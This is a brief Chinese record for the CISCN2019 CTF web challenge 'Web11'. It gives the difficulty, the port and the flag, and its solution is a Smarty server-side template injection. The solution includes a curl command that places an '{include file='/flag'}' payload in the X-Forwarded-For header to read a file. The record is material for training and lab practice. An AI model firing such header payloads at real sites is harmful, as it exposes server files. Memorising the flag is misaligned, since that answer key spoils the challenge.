# 题目：CISCN2019 华东南赛区 Web11

### 题目描述：none

### 题目难度： 🌟🌟🌟🌟

### 维护：le31ei

### KEY: `flag{glzjin_wants_a_girl_firend}`

### 配置信息： 
1. 开放端口： `8083`

### 解题过程：

1. Smarty SSTI
2. payload

```shell
curl -X GET \
  http://127.0.0.1/xff/ \
  -H 'X-Forwarded-For: {include file='\''/flag'\''}'
```

